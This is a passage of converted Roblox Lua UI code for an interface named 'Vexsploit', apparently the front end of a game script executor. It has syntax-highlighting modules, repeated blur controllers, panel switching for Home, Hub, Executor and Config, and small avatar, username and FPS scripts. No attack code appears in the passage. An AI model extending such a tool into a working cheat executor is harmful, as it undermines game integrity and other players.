			Angles = "function",
			fromAxisAngle = "function",
			fromEulerAngles = "function",
			fromEulerAnglesXYZ = "function",
			fromEulerAnglesYXZ = "function",
			fromMatrix = "function",
			fromOrientation = "function",
			lookAt = "function",
			new = "function",

			identity = "CFrame",
		},

		Color3 = {
			fromHex = "function",
			fromHSV = "function",
			fromRGB = "function",
			new = "function",
			toHSV = "function",
		},

		ColorSequence = {
			new = "function",
		},

		ColorSequenceKeypoint = {
			new = "function",
		},

		DateTime = {
			fromIsoDate = "function",
			fromLocalTime = "function",
			fromUniversalTime = "function",
			fromUnixTimestamp = "function",
			fromUnixTimestampMillis = "function",
			now = "function",
		},

		DockWidgetPluginGuiInfo = {
			new = "function",
		},

		Enum = {},

		Faces = {
			new = "function",
		},

		FloatCurveKey = {
			new = "function",
		},

		Font = {
			fromEnum = "function",
			fromId = "function",
			fromName = "function",
			new = "function",
		},

		Instance = {
			new = "function",
		},

		NumberRange = {
			new = "function",
		},

		NumberSequence = {
			new = "function",
		},

		NumberSequenceKeypoint = {
			new = "function",
		},

		OverlapParams = {
			new = "function",
		},

		PathWaypoint = {
			new = "function",
		},

		PhysicalProperties = {
			new = "function",
		},

		Random = {
			new = "function",
		},

		Ray = {
			new = "function",
		},

		RaycastParams = {
			new = "function",
		},

		Rect = {
			new = "function",
		},

		Region3 = {
			new = "function",
		},

		Region3int16 = {
			new = "function",
		},

		RotationCurveKey = {
			new = "function",
		},

		SharedTable = {
			clear = "function",
			clone = "function",
			cloneAndFreeze = "function",
			increment = "function",
			isFrozen = "function",
			new = "function",
			size = "function",
			update = "function",
		},

		task = {
			cancel = "function",
			defer = "function",
			delay = "function",
			desynchronize = "function",
			spawn = "function",
			synchronize = "function",
			wait = "function",
		},

		TweenInfo = {
			new = "function",
		},

		UDim = {
			new = "function",
		},

		UDim2 = {
			fromOffset = "function",
			fromScale = "function",
			new = "function",
		},

		Vector2 = {
			new = "function",

			one = "Vector2",
			xAxis = "Vector2",
			yAxis = "Vector2",
			zero = "Vector2",
		},

		Vector2int16 = {
			new = "function",
		},

		Vector3 = {
			fromAxis = "function",
			FromAxis = "function",
			fromNormalId = "function",
			FromNormalId = "function",
			new = "function",

			one = "Vector3",
			xAxis = "Vector3",
			yAxis = "Vector3",
			zAxis = "Vector3",
			zero = "Vector3",
		},

		Vector3int16 = {
			new = "function",
		},
	},
}

-- Filling up language.libraries.Enum table
local enumLibraryTable = language.libraries.Enum

for _, enum in ipairs(Enum:GetEnums()) do
	--TODO: Remove tostring from here once there is a better way to get the name of an Enum
	enumLibraryTable[tostring(enum)] = "Enum"
end

return language

end;
};
G2L_MODULES[G2L["4b"]] = {
Closure = function()
    local script = G2L["4b"];local DEFAULT_TOKEN_COLORS = {
	["background"] = Color3.fromRGB(47, 47, 47),
	["iden"] = Color3.fromRGB(234, 234, 234),
	["keyword"] = Color3.fromRGB(204, 153, 204),
	["builtin"] = Color3.fromRGB(131, 206, 255),
	["string"] = Color3.fromRGB(196, 255, 193),
	["number"] = Color3.fromRGB(249, 145, 87),
	["comment"] = Color3.fromRGB(153, 153, 153),
	["operator"] = Color3.fromRGB(255, 239, 148),
	["custom"] = Color3.fromRGB(119, 122, 255),
}

local types = require(script.Parent.types)

local Theme = {
	tokenColors = {},
	tokenRichTextFormatter = {},
}

function Theme.setColors(tokenColors: types.TokenColors)
	assert(type(tokenColors) == "table", "Theme.updateColors expects a table")

	for tokenName, color in tokenColors do
		Theme.tokenColors[tokenName] = color
	end
end

function Theme.getColoredRichText(color: Color3, text: string): string
	return '<font color="#' .. color:ToHex() .. '">' .. text .. "</font>"
end

function Theme.getColor(tokenName: types.TokenName): Color3
	return Theme.tokenColors[tokenName]
end

function Theme.matchStudioSettings(refreshCallback: () -> ()): boolean
	local success = pcall(function()
		-- When not used in a Studio plugin, this will error
		-- and the pcall will just silently return
		local studio = settings().Studio
		local studioTheme = studio.Theme

		local function getTokens()
			return {
				["background"] = studioTheme:GetColor(Enum.StudioStyleGuideColor.ScriptBackground),
				["iden"] = studioTheme:GetColor(Enum.StudioStyleGuideColor.ScriptText),
				["keyword"] = studioTheme:GetColor(Enum.StudioStyleGuideColor.ScriptKeyword),
				["builtin"] = studioTheme:GetColor(Enum.StudioStyleGuideColor.ScriptBuiltInFunction),
				["string"] = studioTheme:GetColor(Enum.StudioStyleGuideColor.ScriptString),
				["number"] = studioTheme:GetColor(Enum.StudioStyleGuideColor.ScriptNumber),
				["comment"] = studioTheme:GetColor(Enum.StudioStyleGuideColor.ScriptComment),
				["operator"] = studioTheme:GetColor(Enum.StudioStyleGuideColor.ScriptOperator),
				["custom"] = studioTheme:GetColor(Enum.StudioStyleGuideColor.ScriptBool),
			}
		end

		Theme.setColors(getTokens())
		studio.ThemeChanged:Connect(function()
			studioTheme = studio.Theme
			Theme.setColors(getTokens())
            refreshCallback()
		end)
	end)
	return success
end

-- Initialize
Theme.setColors(DEFAULT_TOKEN_COLORS)

return Theme

end;
};
G2L_MODULES[G2L["4c"]] = {
Closure = function()
    local script = G2L["4c"];export type TextObject = TextLabel | TextBox

export type TokenName =
	"background"
	| "iden"
	| "keyword"
	| "builtin"
	| "string"
	| "number"
	| "comment"
	| "operator"
	| "custom"

export type TokenColors = {
	["background"]: Color3?,
	["iden"]: Color3?,
	["keyword"]: Color3?,
	["builtin"]: Color3?,
	["string"]: Color3?,
	["number"]: Color3?,
	["comment"]: Color3?,
	["operator"]: Color3?,
	["custom"]: Color3?,
}

export type HighlightProps = {
	textObject: TextObject,
	src: string?,
	forceUpdate: boolean?,
	lexer: Lexer?,
	customLang: { [string]: string }?,
}

export type BuildRichTextLinesProps = {
	src: string,
	lexer: Lexer?,
	customLang: { [string]: string }?,
}

export type Lexer = {
	scan: (src: string) -> () -> (string, string),
	navigator: () -> any,
	finished: boolean?,
}

export type ObjectData = {
	Text: string,
	Labels: { TextLabel },
	Lines: { string },
	Lexer: Lexer?,
	CustomLang: { [string]: string }?,
}

return nil

end;
};
G2L_MODULES[G2L["4d"]] = {
Closure = function()
    local script = G2L["4d"];local types = require(script.Parent.types)

local Utility = {}

function Utility.sanitizeRichText(s: string): string
	return string.gsub(
		string.gsub(string.gsub(string.gsub(string.gsub(s, "&", "&amp;"), "<", "&lt;"), ">", "&gt;"), '"', "&quot;"),
		"'",
		"&apos;"
	)
end

function Utility.convertTabsToSpaces(s: string): string
	return string.gsub(s, "\t", "    ")
end

function Utility.removeControlChars(s: string): string
	return string.gsub(s, "[\0\1\2\3\4\5\6\7\8\11\12\13\14\15\16\17\18\19\20\21\22\23\24\25\26\27\28\29\30\31]+", "")
end

function Utility.getInnerAbsoluteSize(textObject: types.TextObject): Vector2
	local fullSize = textObject.AbsoluteSize

	local padding: UIPadding? = textObject:FindFirstChildWhichIsA("UIPadding")
	if padding then
		local offsetX = padding.PaddingLeft.Offset + padding.PaddingRight.Offset
		local scaleX = (fullSize.X * padding.PaddingLeft.Scale) + (fullSize.X * padding.PaddingRight.Scale)
		local offsetY = padding.PaddingTop.Offset + padding.PaddingBottom.Offset
		local scaleY = (fullSize.Y * padding.PaddingTop.Scale) + (fullSize.Y * padding.PaddingBottom.Scale)
		return Vector2.new(fullSize.X - (scaleX + offsetX), fullSize.Y - (scaleY + offsetY))
	else
		return fullSize
	end
end

function Utility.getTextBounds(textObject: types.TextObject): Vector2
	if textObject.ContentText == "" then
		return Vector2.zero
	end

	local textBounds = textObject.TextBounds

	-- Wait for TextBounds to be non-NaN and non-zero because Roblox
	while (textBounds.Y ~= textBounds.Y) or (textBounds.Y < 1) do
		task.wait()
		textBounds = textObject.TextBounds
	end
	return textBounds
end

return Utility

end;
};
-- Workspace.Vexsploit.Sidebar.BlurController
local function C_3()
local script = G2L["3"];
	local Lighting          = game:GetService("Lighting")
	local camera			= workspace.CurrentCamera
	
	local BLUR_SIZE         = Vector2.new(10, 10)
	local PART_SIZE         = 0.01
	local PART_TRANSPARENCY = 1 - 1e-7
	local START_INTENSITY	= 0.25
	
	script.Parent:SetAttribute("BlurIntensity", START_INTENSITY)
	
	local BLUR_OBJ          = Instance.new("DepthOfFieldEffect")
	BLUR_OBJ.FarIntensity   = 0
	BLUR_OBJ.NearIntensity  = script.Parent:GetAttribute("BlurIntensity")
	BLUR_OBJ.FocusDistance  = 0.25
	BLUR_OBJ.InFocusRadius  = 0
	BLUR_OBJ.Parent         = Lighting
	
	local PartsList         = {}
	local BlursList         = {}
	local BlurObjects       = {}
	local BlurredGui        = {}
	
	BlurredGui.__index      = BlurredGui
	
	function rayPlaneIntersect(planePos, planeNormal, rayOrigin, rayDirection)
		local n = planeNormal
		local d = rayDirection
		local v = rayOrigin - planePos
	
		local num = n.x*v.x + n.y*v.y + n.z*v.z
		local den = n.x*d.x + n.y*d.y + n.z*d.z
		local a = -num / den
	
		return rayOrigin + a * rayDirection, a
	end
	
	function rebuildPartsList()
		PartsList = {}
		BlursList = {}
		for blurObj, part in pairs(BlurObjects) do
			table.insert(PartsList, part)
			table.insert(BlursList, blurObj)
		end
	end
	
	function BlurredGui.new(frame, shape)
		local blurPart        = Instance.new("Part")
		blurPart.Size         = Vector3.new(1, 1, 1) * 0.01
		blurPart.Anchored     = true
		blurPart.CanCollide   = false
		blurPart.CanTouch     = false
		blurPart.Material     = Enum.Material.Glass
		blurPart.Transparency = PART_TRANSPARENCY
		blurPart.Parent       = workspace.CurrentCamera
	
		local mesh
		if (shape == "Rectangle") then
			mesh        = Instance.new("BlockMesh")
			mesh.Parent = blurPart
		elseif (shape == "Oval") then
			mesh          = Instance.new("SpecialMesh")
			mesh.MeshType = Enum.MeshType.Sphere
			mesh.Parent   = blurPart
		end
		
		local ignoreInset = false
		local currentObj  = frame
		
		while true do
			currentObj = currentObj.Parent
	
			if (currentObj and currentObj:IsA("ScreenGui")) then
				ignoreInset = currentObj.IgnoreGuiInset
				break
			elseif (currentObj == nil) then
				break
			end
		end
	
		local new = setmetatable({
			Frame          = frame;
			Part           = blurPart;
			Mesh           = mesh;
			IgnoreGuiInset = ignoreInset;
		}, BlurredGui)
	
		BlurObjects[new] = blurPart
		rebuildPartsList()
	
		game:GetService("RunService"):BindToRenderStep("...", Enum.RenderPriority.Camera.Value + 1, function()
			blurPart.CFrame = camera.CFrame * CFrame.new(0,0,0)
			BlurredGui.updateAll()
		end)
		return new
	end
	
	function updateGui(blurObj)
		if (not blurObj.Frame.Visible) then
			blurObj.Part.Transparency = 1
			return
		end
		
		local camera = workspace.CurrentCamera
		local frame  = blurObj.Frame
		local part   = blurObj.Part
		local mesh   = blurObj.Mesh
		
		part.Transparency = PART_TRANSPARENCY
		
		local corner0 = frame.AbsolutePosition + BLUR_SIZE
		local corner1 = corner0 + frame.AbsoluteSize - BLUR_SIZE*2
		local ray0, ray1
	
		if (blurObj.IgnoreGuiInset) then
			ray0 = camera:ViewportPointToRay(corner0.X, corner0.Y, 1)
			ray1 = camera:ViewportPointToRay(corner1.X, corner1.Y, 1)
		else
			ray0 = camera:ScreenPointToRay(corner0.X, corner0.Y, 1)
			ray1 = camera:ScreenPointToRay(corner1.X, corner1.Y, 1)
		end
	
		local planeOrigin = camera.CFrame.Position + camera.CFrame.LookVector * (0.05 - camera.NearPlaneZ)
		local planeNormal = camera.CFrame.LookVector
		local pos0 = rayPlaneIntersect(planeOrigin, planeNormal, ray0.Origin, ray0.Direction)
		local pos1 = rayPlaneIntersect(planeOrigin, planeNormal, ray1.Origin, ray1.Direction)
	
		local pos0 = camera.CFrame:PointToObjectSpace(pos0)
		local pos1 = camera.CFrame:PointToObjectSpace(pos1)
	
		local size   = pos1 - pos0
		local center = (pos0 + pos1)/2
	
		mesh.Offset = center
		mesh.Scale  = size / PART_SIZE
	end
	
	function BlurredGui.updateAll()
		BLUR_OBJ.NearIntensity = tonumber(script.Parent:GetAttribute("BlurIntensity"))
		
		for i = 1, #BlursList do
			updateGui(BlursList[i])
		end
	
		local cframes = table.create(#BlursList, workspace.CurrentCamera.CFrame)
		workspace:BulkMoveTo(PartsList, cframes, Enum.BulkMoveMode.FireCFrameChanged)
	
		BLUR_OBJ.FocusDistance = 0.25 - camera.NearPlaneZ
	end
	
	function BlurredGui:Destroy()
		self.Part:Destroy()
		BlurObjects[self] = nil
		rebuildPartsList()
	end
	
	BlurredGui.new(script.Parent, "Rectangle")
	
	BlurredGui.updateAll()
	return BlurredGui
end;
task.spawn(C_3);
-- Workspace.Vexsploit.Sidebar.Content.Handler
local function C_b()
local script = G2L["b"];
	local home = script.Parent.Home
	local hub = script.Parent.Hub
	local executor = script.Parent.Executor
	local config = script.Parent.Config
	local contentHolder = script.Parent.Parent.Parent.MainFrame
	
	home.MouseButton1Click:Connect(function()
		contentHolder.Home.Visible = true
		contentHolder.Hub.Visible = false
		contentHolder.Executor1.Visible = false
		contentHolder.Config.Visible = false
	end)
	
	executor.MouseButton1Click:Connect(function()
		contentHolder.Home.Visible = false
		contentHolder.Hub.Visible = false
		contentHolder.Executor1.Visible = true
		contentHolder.Config.Visible = false
	end)
	
	hub.MouseButton1Click:Connect(function()
		contentHolder.Home.Visible = false
		contentHolder.Hub.Visible = true
		contentHolder.Executor1.Visible = false
		contentHolder.Config.Visible = false
	end)
	
	config.MouseButton1Click:Connect(function()
		contentHolder.Home.Visible = false
		contentHolder.Hub.Visible = false
		contentHolder.Executor1.Visible = false
		contentHolder.Config.Visible = true
	end)
	
	--Mouse hover
	home.MouseEnter:Connect(function()
		
	end)
	
	executor.MouseEnter:Connect(function()
	
	end)
	
	hub.MouseEnter:Connect(function()
	
	end)
	
	config.MouseEnter:Connect(function()
	
	end)
	
	
	home.MouseLeave:Connect(function()
	
	end)
	
	executor.MouseLeave:Connect(function()
	
	end)
	
	hub.MouseLeave:Connect(function()
	
	end)
	
	config.MouseLeave:Connect(function()
	
	end)
end;
task.spawn(C_b);
-- Workspace.Vexsploit.MainFrame.Home.BlurController
local function C_f()
local script = G2L["f"];
	local Lighting          = game:GetService("Lighting")
	local camera			= workspace.CurrentCamera
	
	local BLUR_SIZE         = Vector2.new(10, 10)
	local PART_SIZE         = 0.01
	local PART_TRANSPARENCY = 1 - 1e-7
	local START_INTENSITY	= 0.25
	
	script.Parent:SetAttribute("BlurIntensity", START_INTENSITY)
	
	local BLUR_OBJ          = Instance.new("DepthOfFieldEffect")
	BLUR_OBJ.FarIntensity   = 0
	BLUR_OBJ.NearIntensity  = script.Parent:GetAttribute("BlurIntensity")
	BLUR_OBJ.FocusDistance  = 0.25
	BLUR_OBJ.InFocusRadius  = 0
	BLUR_OBJ.Parent         = Lighting
	
	local PartsList         = {}
	local BlursList         = {}
	local BlurObjects       = {}
	local BlurredGui        = {}
	
	BlurredGui.__index      = BlurredGui
	
	function rayPlaneIntersect(planePos, planeNormal, rayOrigin, rayDirection)
		local n = planeNormal
		local d = rayDirection
		local v = rayOrigin - planePos
	
		local num = n.x*v.x + n.y*v.y + n.z*v.z
		local den = n.x*d.x + n.y*d.y + n.z*d.z
		local a = -num / den
	
		return rayOrigin + a * rayDirection, a
	end
	
	function rebuildPartsList()
		PartsList = {}
		BlursList = {}
		for blurObj, part in pairs(BlurObjects) do
			table.insert(PartsList, part)
			table.insert(BlursList, blurObj)
		end
	end
	
	function BlurredGui.new(frame, shape)
		local blurPart        = Instance.new("Part")
		blurPart.Size         = Vector3.new(1, 1, 1) * 0.01
		blurPart.Anchored     = true
		blurPart.CanCollide   = false
		blurPart.CanTouch     = false
		blurPart.Material     = Enum.Material.Glass
		blurPart.Transparency = PART_TRANSPARENCY
		blurPart.Parent       = workspace.CurrentCamera
	
		local mesh
		if (shape == "Rectangle") then
			mesh        = Instance.new("BlockMesh")
			mesh.Parent = blurPart
		elseif (shape == "Oval") then
			mesh          = Instance.new("SpecialMesh")
			mesh.MeshType = Enum.MeshType.Sphere
			mesh.Parent   = blurPart
		end
		
		local ignoreInset = false
		local currentObj  = frame
		
		while true do
			currentObj = currentObj.Parent
	
			if (currentObj and currentObj:IsA("ScreenGui")) then
				ignoreInset = currentObj.IgnoreGuiInset
				break
			elseif (currentObj == nil) then
				break
			end
		end
	
		local new = setmetatable({
			Frame          = frame;
			Part           = blurPart;
			Mesh           = mesh;
			IgnoreGuiInset = ignoreInset;
		}, BlurredGui)
	
		BlurObjects[new] = blurPart
		rebuildPartsList()
	
		game:GetService("RunService"):BindToRenderStep("...", Enum.RenderPriority.Camera.Value + 1, function()
			blurPart.CFrame = camera.CFrame * CFrame.new(0,0,0)
			BlurredGui.updateAll()
		end)
		return new
	end
	
	function updateGui(blurObj)
		if (not blurObj.Frame.Visible) then
			blurObj.Part.Transparency = 1
			return
		end
		
		local camera = workspace.CurrentCamera
		local frame  = blurObj.Frame
		local part   = blurObj.Part
		local mesh   = blurObj.Mesh
		
		part.Transparency = PART_TRANSPARENCY
		
		local corner0 = frame.AbsolutePosition + BLUR_SIZE
		local corner1 = corner0 + frame.AbsoluteSize - BLUR_SIZE*2
		local ray0, ray1
	
		if (blurObj.IgnoreGuiInset) then
			ray0 = camera:ViewportPointToRay(corner0.X, corner0.Y, 1)
			ray1 = camera:ViewportPointToRay(corner1.X, corner1.Y, 1)
		else
			ray0 = camera:ScreenPointToRay(corner0.X, corner0.Y, 1)
			ray1 = camera:ScreenPointToRay(corner1.X, corner1.Y, 1)
		end
	
		local planeOrigin = camera.CFrame.Position + camera.CFrame.LookVector * (0.05 - camera.NearPlaneZ)
		local planeNormal = camera.CFrame.LookVector
		local pos0 = rayPlaneIntersect(planeOrigin, planeNormal, ray0.Origin, ray0.Direction)
		local pos1 = rayPlaneIntersect(planeOrigin, planeNormal, ray1.Origin, ray1.Direction)
	
		local pos0 = camera.CFrame:PointToObjectSpace(pos0)
		local pos1 = camera.CFrame:PointToObjectSpace(pos1)
	
		local size   = pos1 - pos0
		local center = (pos0 + pos1)/2
	
		mesh.Offset = center
		mesh.Scale  = size / PART_SIZE
	end
	
	function BlurredGui.updateAll()
		BLUR_OBJ.NearIntensity = tonumber(script.Parent:GetAttribute("BlurIntensity"))
		
		for i = 1, #BlursList do
			updateGui(BlursList[i])
		end
	
		local cframes = table.create(#BlursList, workspace.CurrentCamera.CFrame)
		workspace:BulkMoveTo(PartsList, cframes, Enum.BulkMoveMode.FireCFrameChanged)
	
		BLUR_OBJ.FocusDistance = 0.25 - camera.NearPlaneZ
	end
	
	function BlurredGui:Destroy()
		self.Part:Destroy()
		BlurObjects[self] = nil
		rebuildPartsList()
	end
	
	BlurredGui.new(script.Parent, "Rectangle")
	
	BlurredGui.updateAll()
	return BlurredGui
end;
task.spawn(C_f);
-- Workspace.Vexsploit.MainFrame.Home.HomeControls.BlurController
local function C_13()
local script = G2L["13"];
	local Lighting          = game:GetService("Lighting")
	local camera			= workspace.CurrentCamera
	
	local BLUR_SIZE         = Vector2.new(10, 10)
	local PART_SIZE         = 0.01
	local PART_TRANSPARENCY = 1 - 1e-7
	local START_INTENSITY	= 0.25
	
	script.Parent:SetAttribute("BlurIntensity", START_INTENSITY)
	
	local BLUR_OBJ          = Instance.new("DepthOfFieldEffect")
	BLUR_OBJ.FarIntensity   = 0
	BLUR_OBJ.NearIntensity  = script.Parent:GetAttribute("BlurIntensity")
	BLUR_OBJ.FocusDistance  = 0.25
	BLUR_OBJ.InFocusRadius  = 0
	BLUR_OBJ.Parent         = Lighting
	
	local PartsList         = {}
	local BlursList         = {}
	local BlurObjects       = {}
	local BlurredGui        = {}
	
	BlurredGui.__index      = BlurredGui
	
	function rayPlaneIntersect(planePos, planeNormal, rayOrigin, rayDirection)
		local n = planeNormal
		local d = rayDirection
		local v = rayOrigin - planePos
	
		local num = n.x*v.x + n.y*v.y + n.z*v.z
		local den = n.x*d.x + n.y*d.y + n.z*d.z
		local a = -num / den
	
		return rayOrigin + a * rayDirection, a
	end
	
	function rebuildPartsList()
		PartsList = {}
		BlursList = {}
		for blurObj, part in pairs(BlurObjects) do
			table.insert(PartsList, part)
			table.insert(BlursList, blurObj)
		end
	end
	
	function BlurredGui.new(frame, shape)
		local blurPart        = Instance.new("Part")
		blurPart.Size         = Vector3.new(1, 1, 1) * 0.01
		blurPart.Anchored     = true
		blurPart.CanCollide   = false
		blurPart.CanTouch     = false
		blurPart.Material     = Enum.Material.Glass
		blurPart.Transparency = PART_TRANSPARENCY
		blurPart.Parent       = workspace.CurrentCamera
	
		local mesh
		if (shape == "Rectangle") then
			mesh        = Instance.new("BlockMesh")
			mesh.Parent = blurPart
		elseif (shape == "Oval") then
			mesh          = Instance.new("SpecialMesh")
			mesh.MeshType = Enum.MeshType.Sphere
			mesh.Parent   = blurPart
		end
		
		local ignoreInset = false
		local currentObj  = frame
		
		while true do
			currentObj = currentObj.Parent
	
			if (currentObj and currentObj:IsA("ScreenGui")) then
				ignoreInset = currentObj.IgnoreGuiInset
				break
			elseif (currentObj == nil) then
				break
			end
		end
	
		local new = setmetatable({
			Frame          = frame;
			Part           = blurPart;
			Mesh           = mesh;
			IgnoreGuiInset = ignoreInset;
		}, BlurredGui)
	
		BlurObjects[new] = blurPart
		rebuildPartsList()
	
		game:GetService("RunService"):BindToRenderStep("...", Enum.RenderPriority.Camera.Value + 1, function()
			blurPart.CFrame = camera.CFrame * CFrame.new(0,0,0)
			BlurredGui.updateAll()
		end)
		return new
	end
	
	function updateGui(blurObj)
		if (not blurObj.Frame.Visible) then
			blurObj.Part.Transparency = 1
			return
		end
		
		local camera = workspace.CurrentCamera
		local frame  = blurObj.Frame
		local part   = blurObj.Part
		local mesh   = blurObj.Mesh
		
		part.Transparency = PART_TRANSPARENCY
		
		local corner0 = frame.AbsolutePosition + BLUR_SIZE
		local corner1 = corner0 + frame.AbsoluteSize - BLUR_SIZE*2
		local ray0, ray1
	
		if (blurObj.IgnoreGuiInset) then
			ray0 = camera:ViewportPointToRay(corner0.X, corner0.Y, 1)
			ray1 = camera:ViewportPointToRay(corner1.X, corner1.Y, 1)
		else
			ray0 = camera:ScreenPointToRay(corner0.X, corner0.Y, 1)
			ray1 = camera:ScreenPointToRay(corner1.X, corner1.Y, 1)
		end
	
		local planeOrigin = camera.CFrame.Position + camera.CFrame.LookVector * (0.05 - camera.NearPlaneZ)
		local planeNormal = camera.CFrame.LookVector
		local pos0 = rayPlaneIntersect(planeOrigin, planeNormal, ray0.Origin, ray0.Direction)
		local pos1 = rayPlaneIntersect(planeOrigin, planeNormal, ray1.Origin, ray1.Direction)
	
		local pos0 = camera.CFrame:PointToObjectSpace(pos0)
		local pos1 = camera.CFrame:PointToObjectSpace(pos1)
	
		local size   = pos1 - pos0
		local center = (pos0 + pos1)/2
	
		mesh.Offset = center
		mesh.Scale  = size / PART_SIZE
	end
	
	function BlurredGui.updateAll()
		BLUR_OBJ.NearIntensity = tonumber(script.Parent:GetAttribute("BlurIntensity"))
		
		for i = 1, #BlursList do
			updateGui(BlursList[i])
		end
	
		local cframes = table.create(#BlursList, workspace.CurrentCamera.CFrame)
		workspace:BulkMoveTo(PartsList, cframes, Enum.BulkMoveMode.FireCFrameChanged)
	
		BLUR_OBJ.FocusDistance = 0.25 - camera.NearPlaneZ
	end
	
	function BlurredGui:Destroy()
		self.Part:Destroy()
		BlurObjects[self] = nil
		rebuildPartsList()
	end
	
	BlurredGui.new(script.Parent, "Rectangle")
	
	BlurredGui.updateAll()
	return BlurredGui
end;
task.spawn(C_13);
-- Workspace.Vexsploit.MainFrame.Home.HomeControls.ImageLabel.LocalScript
local function C_16()
local script = G2L["16"];
	local Players = game:GetService("Players")
	local player = Players.LocalPlayer
	local imagelabel = script.Parent
	imagelabel.Image = "rbxthumb://type=AvatarHeadShot&id=" .. player.UserId .. "&w=420&h=420"
end;
task.spawn(C_16);
-- Workspace.Vexsploit.MainFrame.Home.HomeControls.Username.LocalScript
local function C_18()
local script = G2L["18"];
	local plr = game.Players.LocalPlayer
	
	script.Parent.Text = "Welcome, " .. plr.Name
end;
task.spawn(C_18);
-- Workspace.Vexsploit.MainFrame.Home.HomeControls.FPS.FPS
local function C_1a()
local script = G2L["1a"];
	local RS = game:GetService("RunService")
	local frames = 0
	
	RS.RenderStepped:Connect(function()
		frames = frames + 1
	end)
	
	while wait(1) do
		script.Parent.Text = "FPS: " ..frames
		frames = 0
	end
end;
task.spawn(C_1a);
-- Workspace.Vexsploit.MainFrame.Config.BlurController
local function C_20()
local script = G2L["20"];
	local Lighting          = game:GetService("Lighting")
	local camera			= workspace.CurrentCamera
	
	local BLUR_SIZE         = Vector2.new(10, 10)
	local PART_SIZE         = 0.01
	local PART_TRANSPARENCY = 1 - 1e-7
	local START_INTENSITY	= 0.25
	
	script.Parent:SetAttribute("BlurIntensity", START_INTENSITY)
	
	local BLUR_OBJ          = Instance.new("DepthOfFieldEffect")
	BLUR_OBJ.FarIntensity   = 0
	BLUR_OBJ.NearIntensity  = script.Parent:GetAttribute("BlurIntensity")
	BLUR_OBJ.FocusDistance  = 0.25
	BLUR_OBJ.InFocusRadius  = 0
	BLUR_OBJ.Parent         = Lighting
	
	local PartsList         = {}
	local BlursList         = {}
	local BlurObjects       = {}
	local BlurredGui        = {}
	
	BlurredGui.__index      = BlurredGui
	
	function rayPlaneIntersect(planePos, planeNormal, rayOrigin, rayDirection)
		local n = planeNormal
		local d = rayDirection
		local v = rayOrigin - planePos
	
		local num = n.x*v.x + n.y*v.y + n.z*v.z
		local den = n.x*d.x + n.y*d.y + n.z*d.z
		local a = -num / den
	
		return rayOrigin + a * rayDirection, a
	end
	
	function rebuildPartsList()
		PartsList = {}
		BlursList = {}
		for blurObj, part in pairs(BlurObjects) do
			table.insert(PartsList, part)
			table.insert(BlursList, blurObj)
		end
	end
	
	function BlurredGui.new(frame, shape)
		local blurPart        = Instance.new("Part")
		blurPart.Size         = Vector3.new(1, 1, 1) * 0.01
		blurPart.Anchored     = true
		blurPart.CanCollide   = false
		blurPart.CanTouch     = false
		blurPart.Material     = Enum.Material.Glass
		blurPart.Transparency = PART_TRANSPARENCY
		blurPart.Parent       = workspace.CurrentCamera
	
		local mesh
		if (shape == "Rectangle") then
			mesh        = Instance.new("BlockMesh")
			mesh.Parent = blurPart
		elseif (shape == "Oval") then
			mesh          = Instance.new("SpecialMesh")
			mesh.MeshType = Enum.MeshType.Sphere
			mesh.Parent   = blurPart
		end
		
		local ignoreInset = false
		local currentObj  = frame
		
		while true do
			currentObj = currentObj.Parent
	
			if (currentObj and currentObj:IsA("ScreenGui")) then
				ignoreInset = currentObj.IgnoreGuiInset
				break
			elseif (currentObj == nil) then
				break
			end
		end
	
		local new = setmetatable({
			Frame          = frame;
			Part           = blurPart;
			Mesh           = mesh;
			IgnoreGuiInset = ignoreInset;
		}, BlurredGui)
	
		BlurObjects[new] = blurPart
		rebuildPartsList()
	
		game:GetService("RunService"):BindToRenderStep("...", Enum.RenderPriority.Camera.Value + 1, function()
			blurPart.CFrame = camera.CFrame * CFrame.new(0,0,0)
			BlurredGui.updateAll()
		end)
		return new
	end
	
	function updateGui(blurObj)
		if (not blurObj.Frame.Visible) then
			blurObj.Part.Transparency = 1
			return
		end
		
		local camera = workspace.CurrentCamera
		local frame  = blurObj.Frame
		local part   = blurObj.Part
		local mesh   = blurObj.Mesh
		
		part.Transparency = PART_TRANSPARENCY
		
		local corner0 = frame.AbsolutePosition + BLUR_SIZE
		local corner1 = corner0 + frame.AbsoluteSize - BLUR_SIZE*2
		local ray0, ray1
	
		if (blurObj.IgnoreGuiInset) then
			ray0 = camera:ViewportPointToRay(corner0.X, corner0.Y, 1)
			ray1 = camera:ViewportPointToRay(corner1.X, corner1.Y, 1)
		else
			ray0 = camera:ScreenPointToRay(corner0.X, corner0.Y, 1)
			ray1 = camera:ScreenPointToRay(corner1.X, corner1.Y, 1)
		end
	
		local planeOrigin = camera.CFrame.Position + camera.CFrame.LookVector * (0.05 - camera.NearPlaneZ)
		local planeNormal = camera.CFrame.LookVector
		local pos0 = rayPlaneIntersect(planeOrigin, planeNormal, ray0.Origin, ray0.Direction)
		local pos1 = rayPlaneIntersect(planeOrigin, planeNormal, ray1.Origin, ray1.Direction)
	
		local pos0 = camera.CFrame:PointToObjectSpace(pos0)
		local pos1 = camera.CFrame:PointToObjectSpace(pos1)
	
		local size   = pos1 - pos0
		local center = (pos0 + pos1)/2
	
		mesh.Offset = center
		mesh.Scale  = size / PART_SIZE
	end
	
	function BlurredGui.updateAll()
		BLUR_OBJ.NearIntensity = tonumber(script.Parent:GetAttribute("BlurIntensity"))
		
		for i = 1, #BlursList do
			updateGui(BlursList[i])
		end
	
		local cframes = table.create(#BlursList, workspace.CurrentCamera.CFrame)
		workspace:BulkMoveTo(PartsList, cframes, Enum.BulkMoveMode.FireCFrameChanged)
	
		BLUR_OBJ.FocusDistance = 0.25 - camera.NearPlaneZ
	end
	
	function BlurredGui:Destroy()
		self.Part:Destroy()
		BlurObjects[self] = nil
		rebuildPartsList()
	end
	
	BlurredGui.new(script.Parent, "Rectangle")
	
	BlurredGui.updateAll()
	return BlurredGui
end;
task.spawn(C_20);
-- Workspace.Vexsploit.MainFrame.Hub.BlurController
local function C_23()
local script = G2L["23"];
	local Lighting          = game:GetService("Lighting")
	local camera			= workspace.CurrentCamera
	
	local BLUR_SIZE         = Vector2.new(10, 10)
	local PART_SIZE         = 0.01
	local PART_TRANSPARENCY = 1 - 1e-7
	local START_INTENSITY	= 0.25
	
	script.Parent:SetAttribute("BlurIntensity", START_INTENSITY)
	
	local BLUR_OBJ          = Instance.new("DepthOfFieldEffect")
	BLUR_OBJ.FarIntensity   = 0
	BLUR_OBJ.NearIntensity  = script.Parent:GetAttribute("BlurIntensity")
	BLUR_OBJ.FocusDistance  = 0.25
	BLUR_OBJ.InFocusRadius  = 0
	BLUR_OBJ.Parent         = Lighting
	
	local PartsList         = {}
	local BlursList         = {}
